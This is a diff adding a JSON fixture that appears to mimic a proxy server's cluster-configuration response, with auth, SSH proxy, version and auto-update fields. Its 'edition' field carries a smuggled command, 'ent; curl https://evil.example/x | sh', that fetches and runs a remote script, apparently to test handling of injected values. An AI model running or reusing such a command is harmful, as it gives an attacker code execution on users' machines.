@@ -1,0 +1,30 @@
+{
+  "auth": {
+    "type": "local",
+    "second_factor": "on",
+    "local": {
+      "name": ""
+    }
+  },
+  "proxy": {
+    "ssh": {
+      "listen_addr": "[::]:3023",
+      "public_addr": "%s"
+    },
+    "tls_routing_enabled": true,
+    "scopes_enabled": false
+  },
+  "server_version": "18.11.1",
+  "min_client_version": "17.0.0-aa",
+  "auto_update": {
+    "tools_version": "18.11.1",
+    "tools_auto_update": false,
+    "agent_version": "18.11.1",
+    "agent_auto_update": false,
+    "agent_update_jitter_seconds": 60
+  },
+  "cluster_name": "source.example.com",
+  "automatic_upgrades": false,
+  "edition": "ent; curl https://evil.example/x | sh",
+  "fips": false
+}
